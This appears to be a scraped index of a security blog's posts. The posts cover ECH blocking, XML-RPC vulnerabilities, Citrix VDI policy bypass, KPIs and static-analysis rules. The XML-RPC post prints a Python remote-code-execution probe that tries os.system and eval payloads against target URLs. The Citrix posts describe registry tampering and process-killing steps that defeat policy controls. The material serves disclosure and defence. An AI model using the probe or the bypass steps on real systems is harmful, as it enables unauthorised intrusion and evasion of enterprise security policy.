Point: ECH and DoH Are Separate ‚Äì Different Mitigations Required The method described in this post using dnsmasq targets only ECH. DoH is not blocked by this method. Since DoH sends DNS queries over HTTPS, separate network-layer actions such as firewall rules or IP blocking are required. Examples: Block Cloudflare DoH (1.1.1.1:443), Google DoH (8.8.8.8:443), etc. Reference: Cisco Umbrella Guide to Prevent DoH Circumvention Solution: DNS Server-Level Control over ECH Client-side settings can be easily reverted by users, so it is recommended to control ECH centrally at the DNS server.\nBy filtering SVCB (65) and HTTPS (64) records using dnsmasq, clients can be prevented from advertising or negotiating ECH.\nHands-on: Blocking ECH with dnsmasq on macOS For other operating systems (Windows, Linux, etc.), setup steps differ. dnsmasq works across platforms but has different installation procedures.\n1. Install dnsmasq brew install dnsmasq 2. Edit the Configuration File sudo nano /opt/homebrew/etc/dnsmasq.conf Add the following lines:\n# Upstream DNS server server=8.8.8.8 # Filter SVCB (65) and HTTPS (64) records filter-rr=SVCB,HTTPS 3. Start dnsmasq sudo dnsmasq --conf-file=/opt/homebrew/etc/dnsmasq.conf 4. Set System DNS to localhost networksetup -setdnsservers Wi-Fi 127.0.0.1 For Ethernet connections, replace Wi-Fi with Ethernet.\nConfirming ECH is Disabled Visit https://crypto.cloudflare.com/cdn-cgi/trace to check ECH status.\nExample Output: Look for sni=encrypted or sni=plaintext Conclusion Filtering SVCB and HTTPS records using dnsmasq can help block ECH negotiation. DoH is not blocked by this approach and requires firewall-based solutions. For non-macOS users, refer to OS-specific guides or implement firewall/DNS-layer defenses. While blocking ECH improves enterprise visibility, it may reduce user privacy‚Äîthis trade-off should be acknowledged. Note: Finally, for readers who are more deeply interested in technologies related to internet censorship, the net4people/bbs GitHub issues page is a valuable resource where the global community discusses censorship circumvention strategies and the latest research. This forum covers a wide range of topics including the Great Firewall (GFW), Encrypted Client Hello (ECH), DNS encryption, and more, sharing technical insights and solutions.\nReferences Cloudflare on ECH dnsmasq official documentation National Security Agency - Adopting Encrypted DNS in Enterprise Environments Cisco Umbrella Guide on Preventing DoH Circumvention Broadcom\u0026rsquo;s OS-specific DoH blocking strategies ","permalink":"https://windshock.github.io/en/post/2025-03-31-dnsmasq-ech-doh-block/","summary":"\u003cp\u003e\u003cimg alt=\"DNSMASQ-block background\" loading=\"lazy\" src=\"/images/post/dnsmasq-ech-doh-block.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003ePublic DNS services like Cloudflare (1.1.1.1) and Google (8.8.8.8) have increasingly been abused as C2 channels for malware.\u003cbr\u003e\nTechnologies such as DoH (DNS over HTTPS) and ECH (Encrypted Client Hello) encrypt DNS traffic and SNI fields, making it difficult for security solutions to detect and inspect network activity.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e: ESNI (Encrypted SNI) is deprecated and has been replaced by \u003cstrong\u003eECH\u003c/strong\u003e as the current standard. This guide focuses on ECH only.\u003c/p\u003e","title":"How to Block ECH and Mitigate DoH in Enterprise Networks"},{"content":"\nSummary Overview of XML-RPC Vulnerabilities: As a lightweight remote call protocol for inter-system communication, XML-RPC is exposed to various threats such as RCE, XXE, DDoS, and privilege escalation. Notable Cases: NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921), etc. Real-World Use Cases: In addition to WordPress, Bugzilla, ManageEngine, and Apache OFBiz, XML-RPC is still used in some legacy systems. Mitigation Strategies: Disabling XML-RPC, enhancing input validation, reinforcing authentication systems, applying up-to-date security patches, implementing access control, and deploying WAFs. What is XML-RPC? XML-RPC (XML Remote Procedure Call) is a remote procedure call protocol that uses XML as its data format and HTTP as its transport mechanism. Proposed jointly by Dave Winer and Microsoft in 1998, it was designed to simplify cross-platform communication.\nBasic Principles The client sends a request in XML format, and the server responds in XML. It can easily pass through firewalls using standard HTTP(S). History of XML-RPC XML-RPC was widely used in early web services and implemented in various languages including Perl, Java, Python, C, and PHP. Although it later evolved into SOAP, it is still used in some environments due to its simplicity.\nCurrent Status of XML-RPC Its use is declining with the advent of newer technologies such as RESTful APIs and gRPC. WordPress is transitioning to REST API, and XML-RPC is now mostly limited to legacy systems.\nVulnerability Analysis 1. XML Injection \u0026amp; Remote Code Execution (RCE) NodeBB (CVE-2023-43187): RCE possible due to lack of XML input validation Apache OFBiz (CVE-2020-9496): RCE via Java deserialization PHP XML-RPC (CVE-2005-1921): RCE through misuse of eval() 2. XXE (XML External Entity) Apache XML-RPC (CVE-2016-5002): Local file exposure and SSRF possible due to missing external entity deactivation 3. DDoS and Brute Force Attacks system.multicall: Automates brute force attacks pingback.ping: Facilitates DDoS reflection attacks 4. Authentication Bypass \u0026amp; Privilege Escalation WordPress (CVE-2020-28036): Authentication bypass via XML-RPC Real-World Attack Cases SonicWall Report (2018): Over 100,000 XML-RPC attacks detected WPbrutebot: XML-RPC-based brute-force attack tool Pingback DDoS: Large-scale reflection attacks using XML-RPC XML-RPC Exploit Example The following is a Python-based PoC code to detect RCE vulnerabilities in XML-RPC and its execution screen:\nimport xmlrpc.client import ssl import http.client candidate_methods = [ \u0026#34;os.system\u0026#34;, \u0026#34;commands.getoutput\u0026#34;, \u0026#34;subprocess.check_output\u0026#34;, ] candidate_methods_eval = [ \u0026#34;__builtin__.eval\u0026#34;, \u0026#34;builtins.eval\u0026#34;, ] rpc_urls = [ \u0026#34;https://xxx.com/cgi-bin/rpc.cgi\u0026#34;, ] context = ssl._create_unverified_context() class UnverifiedTransport(xmlrpc.client.SafeTransport): def make_connection(self, host): return http.client.HTTPSConnection(host, context=context) for rpc_url in rpc_urls: print(f\u0026#34;[+] Scanning target: {rpc_url}\u0026#34;) client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport()) for method in candidate_methods: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;id\u0026#39;)...\u0026#34;) result = func(\u0026#39;id\u0026#39;) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[‚úî] {method} ‚Üí Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) for method in candidate_methods_eval: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) payload = \u0026#39;__import__(\u0026#34;commands\u0026#34;).getoutput(\u0026#34;id\u0026#34;)\u0026#39; print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;{payload}\u0026#39;)...\u0026#34;) result = func(payload) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[‚úî] {method} ‚Üí Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) ‚ö†Ô∏è Use this script only in authorized environments.\nMajor Services Using XML-RPC System Usage Examples WordPress Posting, comments, pingbacks (moving to REST) Bugzilla Bug submission and update API ManageEngine User account and password management Apache OFBiz ERP integration API Security Hardening Measures Disable XML-RPC (via .htaccess, web server config, plugins) Enhance input validation (regex-based) Apply XXE prevention settings Use API keys, OAuth, JWT authentication Restrict access by IP Deploy Web Application Firewall (WAF) Monitor logs and conduct regular vulnerability assessments Modern Alternatives Comparison Criteria XML-RPC REST GraphQL Data Format XML JSON JSON Structure Method-based Resource-based Query-based Scalability Low High Very High Security Low Medium+ Medium+ Strengths Simple implementation Cacheable Minimized data queries Conclusion \u0026amp; Recommendations Avoid using XML-RPC due to high security risks. If unavoidable, apply strong authentication and access control. Actively consider migrating to REST or GraphQL. Reference Links XML-RPC - Wikipedia CVE-2023-43187 - NodeBB XML Injection CVE-2020-9496 - Apache OFBiz RCE CVE-2005-1921 - PHP XMLRPC Code Injection CVE-2016-5002 - Apache XML-RPC XXE WordPress XML-RPC Security Guide (SolidWP) SonicWall XML-RPC Attack Analysis Report ","permalink":"https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/","summary":"\u003cp\u003e\u003cimg alt=\"XML-RPC background\" loading=\"lazy\" src=\"/images/post/xmlrpc-security.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOverview of XML-RPC Vulnerabilities:\u003c/strong\u003e As a lightweight remote call protocol for inter-system communication, XML-RPC is exposed to various threats such as RCE, XXE, DDoS, and privilege escalation.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNotable Cases:\u003c/strong\u003e NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921), etc.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReal-World Use Cases:\u003c/strong\u003e In addition to WordPress, Bugzilla, ManageEngine, and Apache OFBiz, XML-RPC is still used in some legacy systems.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation Strategies:\u003c/strong\u003e Disabling XML-RPC, enhancing input validation, reinforcing authentication systems, applying up-to-date security patches, implementing access control, and deploying WAFs.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-xml-rpc\"\u003eWhat is XML-RPC?\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eXML-RPC (XML Remote Procedure Call)\u003c/strong\u003e is a remote procedure call protocol that uses XML as its data format and HTTP as its transport mechanism. Proposed jointly by Dave Winer and Microsoft in 1998, it was designed to simplify cross-platform communication.\u003c/p\u003e","title":"XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies"},{"content":"Review of Citrix Security Policy Effectiveness 1. Introduction Citrix administrators apply security policies to each user‚Äôs VDI (Virtual Desktop Infrastructure) through Citrix Group Policy. However, certain structural vulnerabilities in Citrix CSE (Citrix Service Engine) and the Citrix VDI Agent allow for potential bypassing of these security policies.\n2. Security Policy Bypass Bypass through Registry Manipulation A security policy bypass is possible by manipulating the registry using a race condition that occurs during the Citrix VDI Agent (PicaSvc2.exe) policy storage process. While Citrix has implemented a stealth patch to mitigate this vulnerability, it is still possible to disable security policies by adjusting registry security settings and denying write permissions.\nForced Termination of CSE If the Citrix CSE (Citrix Service Engine) is forcibly terminated or deleted, security policies are not applied, potentially allowing unauthorized access to restricted resources.\nGPF File Manipulation Attempting to bypass security policies by modifying the GPF (Group Policy File) or limiting its permissions is possible, though this method is unstable and has several limitations.\n3. Bypass via Registry Modification and Write Permission Denial When a user logs in with a standard account (e.g., User A), Citrix Security Policy settings are created in the registry based on the Windows session ID. Citrix\u0026rsquo;s tendency to prioritize usability over security allows security policies to be bypassed by modifying the registry settings (CdmPolicies, IO, VCPolicies) and denying write permissions for all users. This enables bypassing security policies upon reconnection.\nIn test environments, automatic logout is triggered if the Citrix security policy registry settings are altered and permissions are restricted. By modifying values such as ClearPassword, Domain, and LogonTicket in the ICA file to arbitrary values (e.g., ‚Äútest‚Äù), local accounts can bypass this automatic logout.\nFurthermore, logging in with a local secondary account bypasses forced logout restrictions. Although Citrix limits multi-login sessions, it is possible to complete login by pressing Ctrl-Alt-Del, launching the Task Manager, and terminating the PicaSessionAgent.exe process.\nFinally, logging in with a local account (e.g., \u0026ldquo;windshock\u0026rdquo;) allows use of Citrix VDI without Citrix‚Äôs security policies, as they are bypassed in Windows Session 1.\n4. Conclusion Citrix‚Äôs approach to applying security policies seems to prioritize usability, which may enhance user accessibility but also introduces a structural vulnerability that could facilitate policy bypass. Organizations using Citrix should recognize these potential security bypasses and implement additional internal monitoring or alert systems to enable administrators to respond in real-time.\nFurthermore, if Citrix were to enforce security policies at a lower system level, such as the Xen Hypervisor, this could help maintain a balance between security and usability while effectively preventing bypass attempts. This would ensure that organizations can achieve both the required security and the accessibility Citrix offers.\nReferences Citrix Group Policy Troubleshooting for XenApp and XenDesktop Bypassing Citrix Policy Is Not A Vulnerability, But It Can Be A Violation Of The Law ","permalink":"https://windshock.github.io/en/post/2024-11-05-review-of-citrix-security-policy-effectiveness/","summary":"\u003ch1 id=\"review-of-citrix-security-policy-effectiveness\"\u003eReview of Citrix Security Policy Effectiveness\u003c/h1\u003e\n\u003ch2 id=\"1-introduction\"\u003e1. Introduction\u003c/h2\u003e\n\u003cp\u003eCitrix administrators apply security policies to each user‚Äôs VDI (Virtual Desktop Infrastructure) through Citrix Group Policy. However, certain structural vulnerabilities in Citrix CSE (Citrix Service Engine) and the Citrix VDI Agent allow for potential bypassing of these security policies.\u003c/p\u003e\n\u003ch2 id=\"2-security-policy-bypass\"\u003e2. Security Policy Bypass\u003c/h2\u003e\n\u003ch3 id=\"bypass-through-registry-manipulation\"\u003eBypass through Registry Manipulation\u003c/h3\u003e\n\u003cp\u003eA security policy bypass is possible by manipulating the registry using a race condition that occurs during the Citrix VDI Agent (PicaSvc2.exe) policy storage process. While Citrix has implemented a stealth patch to mitigate this vulnerability, it is still possible to disable security policies by adjusting registry security settings and denying write permissions.\u003c/p\u003e","title":"Review of Citrix Security Policy Effectiveness"},{"content":"KPIs Can Cause Incidents!!! - Bad metrics produce bad outcomes. Recently, I was going through old emails and found a reply from a junior colleague to a very serious email I had sent. The colleague wrote that after reading my message, they realized they had been mindlessly following instructions without deeper consideration. They promised to carefully consider the ethical implications and correctness of every task, and to proceed based on their own judgment going forward.\nUpon further investigation, I realized this colleague managed our vulnerability tracking system. They had been instructed by their team leader to uniformly downgrade the severity ratings of high-risk vulnerabilities. My email had warned them about the potential ethical problems associated with such actions. (Although much time has passed and things have changed, this colleague was very sincere at that time\u0026hellip;)\nSeveral years ago, around the year-end performance evaluation period, a team leader tried to artificially boost KPIs related to vulnerability remediation‚Äîmetrics difficult to control directly. This unethical action made me curious about the potential negative impacts.\nAfter reviewing past vulnerability assessments and incident records, I discovered actual examples where manipulated KPIs led to cybersecurity incidents. Although specifics can\u0026rsquo;t be disclosed due to security reasons, news articles such as \u0026ldquo;[Exclusive] Hacker Redirected Bank SMS Authentication Codes, Bitcoin Accounts Emptied\u0026rdquo; indirectly reported these issues. (Call-forwarding wasn\u0026rsquo;t the only possible method used by attackers.)\nWithout KPI pressures, staff would have operated normally, potentially preventing these incidents. However, in modern organizational structures, KPIs cannot simply be removed.\nWas the problem the way KPIs were structured? Evaluators naturally prefer result-oriented metrics‚Äîeither incidents or vulnerabilities prevented‚Äîwhich limits alternative approaches.\nWas the KPI management process too loose? Would tighter controls and more frequent feedback have prevented this issue? Actually, at that time, we had already formed a dedicated task force that regularly provided feedback on vulnerability risk ratings.\nUltimately, over time, I\u0026rsquo;ve realized KPIs for evaluating leaders have become largely ceremonial. Peter Drucker famously said, \u0026ldquo;You can\u0026rsquo;t manage what you can\u0026rsquo;t measure.\u0026rdquo; However, in organizations created and managed by humans, purely mechanical evaluation was flawed from the start and susceptible to manipulation by human desires.\nCan we truly manage organizations effectively through metrics alone? Can businesses prioritize essence over appearance?\nWorks Cited \u0026ldquo;[Exclusive] Hacker Redirected Bank SMS Authentication Codes, Bitcoin Accounts Emptied.\u0026rdquo; Yonhap News Agency, December 3, 2017. https://www.yna.co.kr/view/MYH20171203004600038. (Accessed June 16, 2024)\n\u0026ldquo;Bad metrics produce bad outcomes.\u0026rdquo; JoongAng Ilbo, March 5, 2017. https://www.joongang.co.kr/article/21337981#home.\n","permalink":"https://windshock.github.io/en/post/2024-06-20-kpi-causes-accidents/","summary":"\u003ch2 id=\"kpis-can-cause-incidents---bad-metrics-produce-bad-outcomes\"\u003eKPIs Can Cause Incidents!!! - Bad metrics produce bad outcomes.\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"KPIs Incidents Toon\" loading=\"lazy\" src=\"/images/post/kpis_incidents.webp\"\u003e\u003c/p\u003e\n\u003cp\u003eRecently, I was going through old emails and found a reply from a junior colleague to a very serious email I had sent. The colleague wrote that after reading my message, they realized they had been mindlessly following instructions without deeper consideration. They promised to carefully consider the ethical implications and correctness of every task, and to proceed based on their own judgment going forward.\u003c/p\u003e","title":"KPIs Can Cause Incidents!!!"},{"content":"Common Misconceptions of Security Assessors Inefficient Vulnerability Evaluation Structure and Response Methods Introduction As the cybersecurity landscape constantly evolves, vulnerability assessment has become a critical defense against potential security breaches. However, due to common misconceptions, the effectiveness of these evaluations often diminishes. In this article, we will explore the common misconceptions about security vulnerability assessments and suggest effective strategies to overcome these issues, ultimately supporting the improvement of organizational security levels.\nCommon Misconceptions About Security Vulnerability Assessments 1. The Belief That All Vulnerabilities Must Be Found Among security vulnerability assessors, there is a widespread belief that all vulnerabilities must be identified. This reflects a failure to understand the limitations of human assessors. According to a study by Tyma et al. (2019)[1], despite extensive efforts, only a few vulnerabilities were discovered.\nAdditionally, there are instances where outsiders who analyze vulnerabilities without the company\u0026rsquo;s approval are met with an exclusionary attitude. These limited perceptions can lead to frustration and dissatisfaction among assessors.\n2. An Overblown Perception of the Security Assessor\u0026rsquo;s Capabilities Security assessors often mistake the idea that they must find every vulnerability and tend to become upset when vulnerabilities they did not discover are reported. To overcome this, it\u0026rsquo;s crucial to recognize the limitations of security assessors and actively use external resources (such as external experts and bug bounty programs)[2] to manage vulnerabilities systematically.\n3. The Misconception That Providing Detailed Descriptions of Vulnerabilities Will Solve the Problem Many believe that providing developers with detailed information about vulnerabilities will completely resolve security issues. However, as seen in the OWASP Top 10[3], even with detailed understanding, basic security issues continue to arise. This is a structural problem that cannot be solved by vulnerability information alone.\nStrategies for Effective Vulnerability Assessment 1. Designing a Repeatable Structure Assessment methods that rely solely on the experience or skills of assessors lack consistency and objectivity. A tool-based approach, systematic checklists, and the introduction of automated analysis should be used o create a repeatable evaluation structure.\n2. Actively Using External Resources Bug bounty programs, external expert groups, and voluntary reports from the community should be actively integrated into security organizations to supplement the limitations of existing approaches.(Shostack, 2014)[4]\n3. Improving Organizational Structure and Changing Perceptions Cultural shifts are necessary to overcome KPI-driven mindsets, performance-based evaluation systems, and negative perceptions about vulnerability reporting. Evaluators should be seen as problem solvers who guide improvements rather than just identifying issues.(Ferrante \u0026amp; Canali, 2012)[5].\nConclusion Security vulnerability assessment is not merely about finding vulnerabilities but is a process to systematically improve an organization\u0026rsquo;s security level. Misconceptions and inefficient structures can undermine the effectiveness of evaluations, and overcoming these requires a repeatable structure, active use of external resources, and a shift in organizational perception.\nIt is time for us to reflect on how much we have built security performance on flawed metrics.\nWorks Cited\nTyma, G. et al. (2019). \u0026ldquo;Limitations of Human Vulnerability Assessors: A Comparative Study.\u0026rdquo; Proceedings of the 34th Annual Computer Security Applications Conference. Whitman, M. E., \u0026amp; Mattord, H. J. (2016). Principles of Information Security. Cengage Learning. OWASP. (2021). \u0026ldquo;OWASP Top 10.\u0026rdquo; The Open Web Application Security Project. Shostack, A. (2014). Threat Modeling: Designing for Security. Wiley. Ferrante, A., \u0026amp; Canali, C. (2012). \u0026ldquo;A Systematic Approach to the Assessment of Security Vulnerabilities.\u0026rdquo; Journal of Information Security and Applications, 17(6), 318-329. ","permalink":"https://windshock.github.io/en/post/2024-06-16-common-misconceptions-of-security-assessors/","summary":"\u003ch1 id=\"common-misconceptions-of-security-assessors\"\u003eCommon Misconceptions of Security Assessors\u003c/h1\u003e\n\u003cp\u003e\u003cimg alt=\"Common Misconceptions Toon\" loading=\"lazy\" src=\"/images/post/misconceptions-of-security-assessors.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"inefficient-vulnerability-evaluation-structure-and-response-methods\"\u003eInefficient Vulnerability Evaluation Structure and Response Methods\u003c/h2\u003e\n\u003ch3 id=\"introduction\"\u003eIntroduction\u003c/h3\u003e\n\u003cp\u003eAs the cybersecurity landscape constantly evolves, vulnerability assessment has become a critical defense against potential security breaches. However, due to common misconceptions, the effectiveness of these evaluations often diminishes. In this article, we will explore the common misconceptions about security vulnerability assessments and suggest effective strategies to overcome these issues, ultimately supporting the improvement of organizational security levels.\u003c/p\u003e","title":"Common Misconceptions of Security Assessors"},{"content":"Can Development Culture Influence Security Levels? Evaluating Code Quality and Security Levels Using Static Analysis Tools (Joern) Background Unlike companies like Google with an open and collaborative development culture, in some organizations that lack such culture, the quality of the code, including security levels, can be heavily influenced by the individual‚Äôs capability. In particular, developers who tend to write poor quality code, such as using the strcpy function, can have their code quality and security levels assessed by utilizing static analysis tools (Joern, CodeQL, etc.) with custom rules. As a result, even in situations where the development culture is lacking, code quality and security levels can be improved, leading to the production of good-quality code.\nGoogle\u0026rsquo;s Development Culture At Google, the Google C++ Style Guide is used to write and manage C++ code. The way this is applied at the organizational level is as follows:\nOrganizational Culture: Google has an open and collaborative organizational culture. This culture encourages developers to collaborate, share knowledge, review each other‚Äôs code, and provide feedback. This helps maintain coding style guidelines and improves the quality of code. Training and Education: Google trains new developers on how to adhere to coding style guidelines and apply them in their actual work. This helps developers understand the coding style guidelines and apply them in their work. Tools and Resources Provided: Google provides developers with tools and resources needed to comply with coding style guidelines. For example, tools like cpplint are provided to automatically check whether code complies with the style guide. Through this approach, Google applies coding style guidelines at the organizational level, which helps maintain code consistency and improve code quality. For further reading, check the Google Style Guide and the C++ Core Guidelines by the C++ Standards Committee.\nOrganizations Without Development Culture In contrast, some organizations lack a strong development culture that encourages collaboration and adherence to coding standards. This is particularly true for companies that frequently outsource development and have frequent changes in outsourcing partners. In these scenarios, inconsistent practices, varying skill levels between developers, and a lack of cohesive standards can lead to deteriorating code quality, including security levels. Consequently, these organizations face higher risks due to security vulnerabilities and subpar code quality.\nRisks of the strcpy Function The strcpy function is used to copy strings. However, the main issue with this function is that it does not check memory boundaries. This means that if the original string\u0026rsquo;s size exceeds the size of the destination memory, a buffer overflow bug can occur. This may result in errors during program execution or cause the program to malfunction.\nTo resolve this issue, the C11 standard provides the strcpy_s function. The strcpy_s function was created to address the shortcomings of strcpy, and when using this function, the size of the destination memory must be specified as the second argument. This helps prevent buffer overflow issues.\nStatic Analysis Tools Using Joern, a comprehensive Code Property Graph (CPG) integrates syntax, control flow, and data flow into a unified structure, thoroughly detecting complex security vulnerabilities and code issues. Joern‚Äôs customizable queries allow precise vulnerability detection tailored to specific project needs, and its scalability enables efficient analysis of large codebases. The tool\u0026rsquo;s functionality automates and integrates various stages of the development lifecycle, helping detect issues early and improve overall code quality. Joern supports multiple programming languages, making it versatile for various development environments.\nHowever, it is not necessary to use Joern exclusively. Similar tools like CodeQL and Checkmarx also provide powerful static analysis capabilities. For more details, refer to the Joern Documentation and related materials on graph databases and code analysis techniques.\nCustom Rule Examples Category Good (Security Level: High, Code Quality: High) Normal (Security Level: Low, Code Quality: Low) Bad (Security Level: Critical, Code Quality: Low) Description Input validation must always be performed. Input size should always be checked, or functions that check input size (such as strncpy, strlcpy, strcpy_s) should be used instead. Input size is checked, but dangerous functions are still used. Developers may be vulnerable to exceptional cases where input size is misunderstood for data types. Failing to check input size before buffer copy (\u0026lsquo;Traditional Buffer Overflow\u0026rsquo;). This can lead to critical security vulnerabilities, such as privilege escalation and unintended command execution. Case strlen_malloc_strncpy ZIP_EXTERN zip_int64_t zip_add_dir(struct‚ÄØzip *za,‚ÄØconst‚ÄØchar‚ÄØ*name) { size_t‚ÄØMAXSIZE = 1024; char* sInput = (char*)malloc(MAXSIZE); memset(sInput, 0, MAXSIZE); \u0026hellip; \u0026hellip; const‚ÄØjbyte* javaStr; jint result = -1; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, NULL); if(javaStr == NULL) goto‚ÄØend; strncpy(sInput, javaStr, MAXSIZE); \u0026hellip;\u0026hellip; \u0026hellip;\u0026hellip; } strlen_malloc_strcpy ZIP_EXTERN zip_int64_t zip_add_dir(struct‚ÄØzip *za,‚ÄØconst‚ÄØchar‚ÄØ*name) { int‚ÄØlen; char‚ÄØ*s; \u0026hellip;\u0026hellip; s = NULL; len =‚ÄØstrlen(name); if‚ÄØ(name[len-1] !=‚ÄØ\u0026lsquo;/\u0026rsquo;) { if‚ÄØ((s=(char‚ÄØ*)malloc(len+2)) == NULL) { _zip_error_set(\u0026amp;za-\u0026gt;error, ZIP_ER_MEMORY, 0); return‚ÄØ-1; }‚ÄØstrcpy(s, name); \u0026hellip;\u0026hellip; } malloc(Ï†ïÏàò)_strcpy Java_com_skt_skaf_OA00050017_engine_ComicEngineJNI_Open (JNIEnv* env, drmFileName, \u0026hellip;\u0026hellip;) { char* sInput = (char*)malloc(1024); \u0026hellip;\u0026hellip; const‚ÄØjbyte* javaStr; \u0026hellip;\u0026hellip; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, ((void*)0)); \u0026hellip;\u0026hellip; strcpy(sInput, javaStr); \u0026hellip;\u0026hellip; } Source/ Sink Source : * Sink :‚ÄØstrncpy, strlcpy, strcpy_s Source : * Sink : strcpy, strcat, sprintf, vsprintf, gets Source : GetStringUTFChars Sink : strcpy, strcat, sprintf, vsprintf, gets Pattern The parameter for malloc is an additive expression, and its data flow has strlen preceding it and strcpy following it. The parameter for malloc is an additive expression, and its data flow has strlen preceding it and strcpy following it. The malloc parameter takes an integer input, and the data flow uses strcpy. Known functions with no length limit (such as GetStringUTFChars) are used as the input to strcpy. Rule echo‚ÄØ\u0026quot;‚ÄØ\\ getCallsTo(\u0026lsquo;malloc\u0026rsquo;)‚ÄØ\\ .ithArguments(\u0026lsquo;0\u0026rsquo;).children().has(\u0026rsquo;type\u0026rsquo;,\u0026lsquo;AdditiveExpression\u0026rsquo;).statements()‚ÄØ\\ .or(‚ÄØ\\ __.in(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;))‚ÄØ\\ .out(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*malloc.*\u0026rsquo;)),‚ÄØ\\ __.has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;))‚ÄØ\\ ).out(\u0026lsquo;REACHES\u0026rsquo;)‚ÄØ\\ .has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*strncpy.* .*strlcpys.* .*strcpy_s.*\u0026rsquo;))‚ÄØ\\ .id()\u0026quot; Ï∞∏Í≥† https://randomascii.wordpress.com/2013/04/03/stop-using-strncpy-already/ https://www.cse.psu.edu/~gxt29/papers/jdksecurity.pdf ","permalink":"https://windshock.github.io/en/post/2024-05-22-can-development-culture-influence-security-levels/","summary":"\u003ch1 id=\"can-development-culture-influence-security-levels\"\u003eCan Development Culture Influence Security Levels?\u003c/h1\u003e\n\u003cp\u003e\u003cimg alt=\"Development Culture\" loading=\"lazy\" src=\"/images/post/development-culture.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"evaluating-code-quality-and-security-levels-using-static-analysis-tools-joern\"\u003eEvaluating Code Quality and Security Levels Using Static Analysis Tools (Joern)\u003c/h2\u003e\n\u003ch3 id=\"background\"\u003eBackground\u003c/h3\u003e\n\u003cp\u003eUnlike companies like \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#google-development-culture\"\u003eGoogle\u003c/a\u003e with an open and collaborative development culture, in some organizations that lack such culture, the quality of the code, including security levels, can be heavily influenced by the individual‚Äôs capability. In particular, developers who tend to write poor quality code, such as using the \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#strcpy-function-risk\"\u003estrcpy function\u003c/a\u003e, can have their code quality and security levels assessed by utilizing \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#static-analysis-tools\"\u003estatic analysis tools\u003c/a\u003e (Joern, CodeQL, etc.) with \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#custom-rule-examples\"\u003ecustom rules\u003c/a\u003e. As a result, even in situations where the development culture is lacking, code quality and security levels can be improved, leading to the production of good-quality code.\u003c/p\u003e","title":"Can Development Culture Influence Security Levels?"},{"content":"Bypassing Citrix Policy is Not a Vulnerability but a Legal Violation Note!! Based on discussions with Citrix through VINCE from cert.org, it was concluded that this is not classified as a vulnerability because it requires administrative privileges. Therefore, I can share this information without security concerns. However, for security reasons, I do not recommend using Xendesktop (VDI) in special environments such as logically isolated or closed networks. If VDI must be used in such environments, please ensure that administrator privileges are removed and security-specific software is installed.\nWhile the need for administrative privileges may reduce the risk, it does not eliminate the potential impact. Below is a detailed technical explanation of how the Citrix policy can be bypassed.\nDescription The Citrix VDI Agent (PicaSvc2.exe) seems to follow a structure where it receives policies from the Citrix management server, records them in the registry (HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User), and applies these policies by reading from the registry. An attacker can bypass security policies for drives, network access, clipboard operations, etc., enforced by the Citrix Policy Server through manipulation of the registry (refer to the proof of concept [POC] below).\nAccording to Citrix\u0026rsquo;s Common Criteria Certification documentation, protections are designed to prevent an attacker from altering this configuration data (Configdata). This type of bypass could be considered an implementation flaw.\nIf VDI is used in closed or isolated network environments, bypassing Citrix Policy and forcibly connecting the VDI to the internet could expose sensitive internal information to external parties. In South Korea, such actions are a clear violation of the law and would require a reassessment of network isolation measures.\nProof of Concept (POC) An attacker would first need to log into the company\u0026rsquo;s Citrix VDI (running Windows 10) after gaining access to the company‚Äôs account. The VDI environment is typically restricted from network access, printer use, external drives, clipboard access, etc.\nThe attacker logs into the VDI and runs a batch file (download link) that continuously modifies the registry, then disconnects from the VDI session.\nAfter running the batch file to modify the registry, the attacker disconnects from the VDI. Upon reconnection, the registry values have been tampered with, allowing the attacker to bypass Citrix policies.\nExample registry modification:\nWindows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User] 